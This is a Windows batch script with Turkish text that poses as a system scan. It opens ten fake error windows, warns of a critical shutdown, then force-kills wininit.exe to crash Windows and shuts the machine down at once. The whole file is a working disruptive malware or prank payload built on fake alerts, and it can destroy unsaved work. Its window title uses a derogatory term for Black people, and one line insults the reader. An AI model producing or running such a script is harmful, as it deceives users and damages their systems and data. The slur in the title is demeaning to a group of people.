@echo off
title ZENCİLER
color 0c


echo Sistem taranıyor...
set /a sayac=0
:dongu
start /min cmd /c "echo HATA! Sistem dosyasi bulunamadi. & pause"
set /a sayac=%sayac%+1
if %sayac%==10 goto bekle
goto dongu

:bekle
cls
echo.
echo !!! DIKKAT !!!
echo 10 saniye icinde sistem kritik bir hata nedeniyle kapatilacak.
echo LUTFEN EŞŞEKLERİ UZAK TUTUN
echo.


timeout /t 10



taskkill /f /im wininit.exe


shutdown /s /t 00